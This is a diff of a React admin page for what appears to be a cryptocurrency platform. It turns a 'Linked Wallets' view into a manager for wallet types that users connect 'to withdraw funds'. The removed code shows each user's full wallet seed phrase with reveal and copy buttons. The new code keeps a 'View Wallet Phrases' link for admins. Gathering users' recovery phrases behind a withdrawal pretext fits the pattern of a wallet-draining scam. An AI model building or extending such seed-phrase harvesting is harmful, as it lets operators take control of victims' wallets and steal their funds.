@@ -1,6 +1,8 @@
 import { AdminLayout } from "@/components/layout/admin-layout";
-import { Card, CardContent } from "@/components/ui/card";
+import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
 import { 
   Table, 
   TableBody, 
@@ -9,65 +11,170 @@ import {
   TableHeader, 
   TableRow 
 } from "@/components/ui/table";
-import { ArrowLeft, Wallet, Copy, Eye, EyeOff, Loader2 } from "lucide-react";
+import { 
+  Dialog,
+  DialogContent,
+  DialogDescription,
+  DialogFooter,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog";
+import { 
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select";
+import { ArrowLeft, Wallet, Plus, Pencil, Trash2, Loader2, Eye } from "lucide-react";
 import { useState } from "react";
 import { useToast } from "@/hooks/use-toast";
 import { Badge } from "@/components/ui/badge";
-import { useQuery } from "@tanstack/react-query";
+import { useQuery, useQueryClient } from "@tanstack/react-query";
 import { Link } from "wouter";
 
-interface ConnectedWallet {
+interface LinkedWalletType {
   id: number;
-  userId: number;
   name: string;
   logo: string | null;
-  address: string;
-  seedPhrase: string | null;
-  connectedAt: string;
-  isDeleted: boolean;
-  user?: {
-    id: number;
-    username: string;
-    firstName: string;
-    lastName: string;
-  };
+  minAmount: string;
+  maxAmount: string;
+  supportedCoins: string[];
+  status: string;
+  createdAt: string;
 }
+
+const DEFAULT_COINS = ["Bitcoin", "Ethereum", "USDT", "TRON", "BNB", "Solana"];
 
 export default function AdminLinkedWallets() {
   const { toast } = useToast();
-  const [showPhrases, setShowPhrases] = useState<{ [key: number]: boolean }>({});
+  const queryClient = useQueryClient();
+  const [isDialogOpen, setIsDialogOpen] = useState(false);
+  const [editingWallet, setEditingWallet] = useState<LinkedWalletType | null>(null);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  
+  const [formData, setFormData] = useState({
+    name: "",
+    logo: "",
+    minAmount: "",
+    maxAmount: "",
+    supportedCoins: [] as string[],
+    status: "enabled"
+  });
 
-  const { data: wallets = [], isLoading } = useQuery<ConnectedWallet[]>({
-    queryKey: ['/api/admin/connected-wallets'],
+  const { data: walletTypes = [], isLoading } = useQuery<LinkedWalletType[]>({
+    queryKey: ['/api/linked-wallet-types'],
     queryFn: async () => {
-      const res = await fetch('/api/admin/connected-wallets');
-      if (!res.ok) throw new Error('Failed to fetch wallets');
+      const res = await fetch('/api/linked-wallet-types');
+      if (!res.ok) throw new Error('Failed to fetch wallet types');
       return res.json();
     }
   });
 
-  const formatDate = (dateString: string) => {
-    return new Date(dateString).toLocaleString('en-US', {
-      year: 'numeric',
-      month: 'short',
-      day: '2-digit',
-      hour: '2-digit',
-      minute: '2-digit'
+  const resetForm = () => {
+    setFormData({
+      name: "",
+      logo: "",
+      minAmount: "",
+      maxAmount: "",
+      supportedCoins: [],
+      status: "enabled"
     });
+    setEditingWallet(null);
   };
 
-  const copyToClipboard = (text: string, label: string) => {
-    navigator.clipboard.writeText(text);
-    toast({ title: "Copied", description: `${label} copied to clipboard.` });
+  const openAddDialog = () => {
+    resetForm();
+    setIsDialogOpen(true);
   };
 
-  const toggleShowPhrase = (id: number) => {
-    setShowPhrases(prev => ({ ...prev, [id]: !prev[id] }));
+  const openEditDialog = (walletType: LinkedWalletType) => {
+    setEditingWallet(walletType);
+    setFormData({
+      name: walletType.name,
+      logo: walletType.logo || "",
+      minAmount: walletType.minAmount,
+      maxAmount: walletType.maxAmount,
+      supportedCoins: walletType.supportedCoins || [],
+      status: walletType.status
+    });
+    setIsDialogOpen(true);
   };
 
-  const truncateAddress = (address: string) => {
-    if (address.length <= 20) return address;
-    return `${address.slice(0, 10)}...${address.slice(-8)}`;
+  const handleSubmit = async () => {
+    if (!formData.name || !formData.minAmount || !formData.maxAmount) {
+      toast({
+        title: "Missing Fields",
+        description: "Please fill in all required fields.",
+        variant: "destructive"
+      });
+      return;
+    }
+
+    setIsSubmitting(true);
+    try {
+      const url = editingWallet 
+        ? `/api/linked-wallet-types/${editingWallet.id}`
+        : '/api/linked-wallet-types';
+      
+      const method = editingWallet ? 'PATCH' : 'POST';
+      
+      const res = await fetch(url, {
+        method,
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(formData)
+      });
+
+      if (!res.ok) throw new Error('Failed to save wallet type');
+
+      toast({
+        title: editingWallet ? "Wallet Type Updated" : "Wallet Type Created",
+        description: `${formData.name} has been ${editingWallet ? 'updated' : 'created'} successfully.`
+      });
+
+      queryClient.invalidateQueries({ queryKey: ['/api/linked-wallet-types'] });
+      setIsDialogOpen(false);
+      resetForm();
+    } catch (error) {
+      toast({
+        title: "Error",
+        description: "Failed to save wallet type. Please try again.",
+        variant: "destructive"
+      });
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
+
+  const handleDelete = async (id: number) => {
+    if (!confirm("Are you sure you want to delete this wallet type?")) return;
+
+    try {
+      const res = await fetch(`/api/linked-wallet-types/${id}`, { method: 'DELETE' });
+      if (!res.ok) throw new Error('Failed to delete');
+
+      toast({
+        title: "Wallet Type Deleted",
+        description: "The wallet type has been deleted successfully."
+      });
+
+      queryClient.invalidateQueries({ queryKey: ['/api/linked-wallet-types'] });
+    } catch (error) {
+      toast({
+        title: "Error",
+        description: "Failed to delete wallet type.",
+        variant: "destructive"
+      });
+    }
+  };
+
+  const toggleCoin = (coin: string) => {
+    setFormData(prev => ({
+      ...prev,
+      supportedCoins: prev.supportedCoins.includes(coin)
+        ? prev.supportedCoins.filter(c => c !== coin)
+        : [...prev.supportedCoins, coin]
+    }));
   };
 
   return (
@@ -81,14 +188,21 @@ export default function AdminLinkedWallets() {
             </Button>
           </Link>
           <div>
-            <h1 style={{ fontSize: '20px', fontWeight: 700, color: '#111827' }}>Linked Wallets</h1>
-            <p style={{ fontSize: '14px', color: '#6b7280', marginTop: '4px' }}>View all user connected external wallets</p>
+            <h1 style={{ fontSize: '20px', fontWeight: 700, color: '#111827' }}>Linked Wallet Types</h1>
+            <p style={{ fontSize: '14px', color: '#6b7280', marginTop: '4px' }}>Manage wallet options users can connect (Trust Wallet, MetaMask, etc.)</p>
           </div>
         </div>
-        <div style={{ display: 'flex', alignItems: 'center', gap: '8px', backgroundColor: '#f3f4f6', padding: '8px 16px', borderRadius: '8px' }}>
-          <Wallet size={20} style={{ color: '#6f42c1' }} />
-          <span style={{ fontWeight: 600, color: '#111827' }}>{wallets.length}</span>
-          <span style={{ color: '#6b7280' }}>Total Wallets</span>
+        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+          <Link href="/admin/wallet-phrases">
+            <Button variant="outline" size="sm" data-testid="button-view-phrases">
+              <Eye size={16} style={{ marginRight: '8px' }} />
+              View Wallet Phrases
+            </Button>
+          </Link>
+          <Button onClick={openAddDialog} data-testid="button-add-wallet-type">
+            <Plus size={16} style={{ marginRight: '8px' }} />
+            Add Wallet Type
+          </Button>
         </div>
       </div>
 
@@ -97,115 +211,89 @@ export default function AdminLinkedWallets() {
           {isLoading ? (
             <div style={{ textAlign: 'center', padding: '48px' }}>
               <Loader2 className="h-8 w-8 animate-spin mx-auto" style={{ color: '#6b7280' }} />
-              <p style={{ marginTop: '16px', color: '#6b7280' }}>Loading wallets...</p>
+              <p style={{ marginTop: '16px', color: '#6b7280' }}>Loading wallet types...</p>
             </div>
-          ) : wallets.length === 0 ? (
+          ) : walletTypes.length === 0 ? (
             <div style={{ textAlign: 'center', padding: '48px 24px', backgroundColor: '#f9fafb', borderRadius: '8px', border: '1px dashed #e5e7eb' }}>
               <Wallet size={48} style={{ color: '#d1d5db', margin: '0 auto 16px' }} />
-              <p style={{ color: '#6b7280', fontSize: '14px' }}>No connected wallets found</p>
+              <p style={{ color: '#6b7280', fontSize: '14px' }}>No wallet types configured</p>
               <p style={{ color: '#9ca3af', fontSize: '12px', marginTop: '4px' }}>
-                Users can connect external wallets from their wallet page
+                Add wallet types like Trust Wallet, MetaMask, Phantom for users to connect
               </p>
+              <Button onClick={openAddDialog} style={{ marginTop: '16px' }} data-testid="button-add-first-wallet-type">
+                <Plus size={16} style={{ marginRight: '8px' }} />
+                Add First Wallet Type
+              </Button>
             </div>
           ) : (
             <div style={{ overflowX: 'auto' }}>
               <Table>
                 <TableHeader>
                   <TableRow>
-                    <TableHead>User</TableHead>
-                    <TableHead>Wallet Name</TableHead>
-                    <TableHead>Address</TableHead>
-                    <TableHead>Seed Phrase</TableHead>
-                    <TableHead>Connected At</TableHead>
+                    <TableHead>Wallet</TableHead>
+                    <TableHead>Min Amount</TableHead>
+                    <TableHead>Max Amount</TableHead>
+                    <TableHead>Supported Coins</TableHead>
+                    <TableHead>Status</TableHead>
+                    <TableHead>Actions</TableHead>
                   </TableRow>
                 </TableHeader>
                 <TableBody>
-                  {wallets.map((wallet) => (
-                    <TableRow key={wallet.id}>
-                      <TableCell>
-                        <div>
-                          <p style={{ fontWeight: 500, fontSize: '14px' }}>
-                            {wallet.user?.firstName || 'User'} {wallet.user?.lastName || ''}
-                          </p>
-                          <p style={{ fontSize: '12px', color: '#6b7280' }}>
-                            @{wallet.user?.username || `user_${wallet.userId}`}
-                          </p>
-                        </div>
-                      </TableCell>
+                  {walletTypes.map((wallet) => (
+                    <TableRow key={wallet.id} data-testid={`row-wallet-type-${wallet.id}`}>
                       <TableCell>
                         <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
-                          {wallet.logo && (
+                          {wallet.logo ? (
                             <img 
                               src={wallet.logo} 
-                              alt={wallet.name}
-                              style={{ width: '32px', height: '32px', borderRadius: '50%', objectFit: 'cover' }}
+                              alt={wallet.name} 
+                              style={{ width: '32px', height: '32px', objectFit: 'contain', borderRadius: '8px' }}
                             />
+                          ) : (
+                            <div style={{ width: '32px', height: '32px', backgroundColor: '#f3f4f6', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+                              <Wallet size={16} style={{ color: '#9ca3af' }} />
+                            </div>
                           )}
                           <span style={{ fontWeight: 500 }}>{wallet.name}</span>
                         </div>
                       </TableCell>
+                      <TableCell>${parseFloat(wallet.minAmount).toFixed(2)}</TableCell>
+                      <TableCell>${parseFloat(wallet.maxAmount).toFixed(2)}</TableCell>
                       <TableCell>
-                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-                          <code style={{ fontSize: '11px', backgroundColor: '#f3f4f6', padding: '4px 8px', borderRadius: '4px' }}>
-                            {truncateAddress(wallet.address)}
-                          </code>
-                          <Button
-                            size="sm"
-                            variant="ghost"
-                            onClick={() => copyToClipboard(wallet.address, 'Address')}
-                            style={{ padding: '4px' }}
-                            data-testid={`button-copy-address-${wallet.id}`}
-                          >
-                            <Copy size={14} />
-                          </Button>
+                        <div style={{ display: 'flex', flexWrap: 'wrap', gap: '4px' }}>
+                          {(wallet.supportedCoins || []).slice(0, 3).map((coin) => (
+                            <Badge key={coin} variant="secondary" style={{ fontSize: '10px' }}>{coin}</Badge>
+                          ))}
+                          {(wallet.supportedCoins || []).length > 3 && (
+                            <Badge variant="outline" style={{ fontSize: '10px' }}>+{wallet.supportedCoins.length - 3}</Badge>
+                          )}
                         </div>
                       </TableCell>
                       <TableCell>
-                        {wallet.seedPhrase ? (
-                          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-                            {showPhrases[wallet.id] ? (
-                              <code style={{ 
-                                fontSize: '10px', 
-                                backgroundColor: '#fef3c7', 
-                                padding: '4px 8px', 
-                                borderRadius: '4px',
-                                maxWidth: '200px',
-                                overflow: 'hidden',
-                                textOverflow: 'ellipsis',
-                                whiteSpace: 'nowrap'
-                              }}>
-                                {wallet.seedPhrase}
-                              </code>
-                            ) : (
-                              <Badge variant="outline" style={{ fontSize: '10px' }}>Hidden</Badge>
-                            )}
-                            <Button
-                              size="sm"
-                              variant="ghost"
-                              onClick={() => toggleShowPhrase(wallet.id)}
-                              style={{ padding: '4px' }}
-                              data-testid={`button-toggle-phrase-${wallet.id}`}
-                            >
-                              {showPhrases[wallet.id] ? <EyeOff size={14} /> : <Eye size={14} />}
-                            </Button>
-                            {showPhrases[wallet.id] && (
-                              <Button
-                                size="sm"
-                                variant="ghost"
-                                onClick={() => copyToClipboard(wallet.seedPhrase!, 'Seed phrase')}
-                                style={{ padding: '4px' }}
-                                data-testid={`button-copy-phrase-${wallet.id}`}
-                              >
-                                <Copy size={14} />
-                              </Button>
-                            )}
-                          </div>
-                        ) : (
-                          <Badge variant="outline" style={{ fontSize: '10px', color: '#9ca3af' }}>Not provided</Badge>
-                        )}
+                        <Badge variant={wallet.status === 'enabled' ? 'default' : 'secondary'}>
+                          {wallet.status}
+                        </Badge>
                       </TableCell>
-                      <TableCell style={{ fontSize: '12px', color: '#6b7280' }}>
-                        {formatDate(wallet.connectedAt)}
+                      <TableCell>
+                        <div style={{ display: 'flex', gap: '8px' }}>
+                          <Button 
+                            variant="ghost" 
+                            size="sm" 
+                            onClick={() => openEditDialog(wallet)}
+                            data-testid={`button-edit-wallet-${wallet.id}`}
+                          >
+                            <Pencil size={14} />
+                          </Button>
+                          <Button 
+                            variant="ghost" 
+                            size="sm" 
+                            onClick={() => handleDelete(wallet.id)}
+                            style={{ color: '#ef4444' }}
+                            data-testid={`button-delete-wallet-${wallet.id}`}
+                          >
+                            <Trash2 size={14} />
+                          </Button>
+                        </div>
                       </TableCell>
                     </TableRow>
                   ))}
@@ -215,6 +303,115 @@ export default function AdminLinkedWallets() {
           )}
         </CardContent>
       </Card>
+
+      <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
+        <DialogContent className="sm:max-w-lg">
+          <DialogHeader>
+            <DialogTitle>{editingWallet ? 'Edit Wallet Type' : 'Add Wallet Type'}</DialogTitle>
+            <DialogDescription>
+              Configure a wallet option that users can connect to withdraw funds
+            </DialogDescription>
+          </DialogHeader>
+
+          <div className="space-y-4 py-4">
+            <div className="space-y-2">
+              <Label htmlFor="name">Wallet Name *</Label>
+              <Input
+                id="name"
+                placeholder="e.g., Trust Wallet"
+                value={formData.name}
+                onChange={(e) => setFormData({ ...formData, name: e.target.value })}
+                data-testid="input-wallet-name"
+              />
+            </div>
+
+            <div className="space-y-2">
+              <Label htmlFor="logo">Logo URL</Label>
+              <Input
+                id="logo"
+                placeholder="https://example.com/logo.png"
+                value={formData.logo}
+                onChange={(e) => setFormData({ ...formData, logo: e.target.value })}
+                data-testid="input-wallet-logo"
+              />
+            </div>
+
+            <div className="grid grid-cols-2 gap-4">
+              <div className="space-y-2">
+                <Label htmlFor="minAmount">Min Amount (USD) *</Label>
+                <Input
+                  id="minAmount"
+                  type="number"
+                  placeholder="10.00"
+                  value={formData.minAmount}
+                  onChange={(e) => setFormData({ ...formData, minAmount: e.target.value })}
+                  data-testid="input-min-amount"
+                />
+              </div>
+              <div className="space-y-2">
+                <Label htmlFor="maxAmount">Max Amount (USD) *</Label>
+                <Input
+                  id="maxAmount"
+                  type="number"
+                  placeholder="10000.00"
+                  value={formData.maxAmount}
+                  onChange={(e) => setFormData({ ...formData, maxAmount: e.target.value })}
+                  data-testid="input-max-amount"
+                />
+              </div>
+            </div>
+
+            <div className="space-y-2">
+              <Label>Supported Coins</Label>
+              <div className="flex flex-wrap gap-2 p-3 border rounded-lg bg-gray-50">
+                {DEFAULT_COINS.map((coin) => (
+                  <Badge
+                    key={coin}
+                    variant={formData.supportedCoins.includes(coin) ? "default" : "outline"}
+                    className="cursor-pointer"
+                    onClick={() => toggleCoin(coin)}
+                    data-testid={`badge-coin-${coin}`}
+                  >
+                    {coin}
+                  </Badge>
+                ))}
+              </div>
+            </div>
+
+            <div className="space-y-2">
+              <Label htmlFor="status">Status</Label>
+              <Select
+                value={formData.status}
+                onValueChange={(value) => setFormData({ ...formData, status: value })}
+              >
+                <SelectTrigger data-testid="select-status">
+                  <SelectValue placeholder="Select status" />
+                </SelectTrigger>
+                <SelectContent>
+                  <SelectItem value="enabled">Enabled</SelectItem>
+                  <SelectItem value="disabled">Disabled</SelectItem>
+                </SelectContent>
+              </Select>
+            </div>
+          </div>
+
+          <DialogFooter>
+            <Button variant="outline" onClick={() => setIsDialogOpen(false)} disabled={isSubmitting}>
+              Cancel
+            </Button>
+            <Button onClick={handleSubmit} disabled={isSubmitting} data-testid="button-save-wallet-type">
+              {isSubmitting ? (
+                <>
+                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                  Saving...
+                </>
+              ) : (
+                editingWallet ? 'Update' : 'Create'
+              )}
+            </Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
     </AdminLayout>
   );
 }
